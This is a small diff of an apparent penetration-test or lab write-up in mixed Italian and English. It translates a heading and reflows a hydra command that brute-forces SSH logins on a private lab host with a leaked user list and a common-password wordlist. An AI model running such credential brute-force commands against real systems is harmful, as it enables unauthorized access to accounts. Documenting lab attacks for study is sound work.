@@ -154,10 +154,9 @@ Information disclosure critico - la lista di utenti validi del sistema è stata 
 **Target Service:** SSH (port 22)  
 **Attack Type:** Dictionary-based brute force
 
-**Initial Attempt (Failed):**
+**Tentativo Iniziale (Fallito):**
 ```bash
-hydra -L users.txt.bk -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
-192.168.50.9 ssh
+hydra -L users.txt.bk -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 192.168.50.9 ssh
 ```
 
 **Errore Riscontrato:**
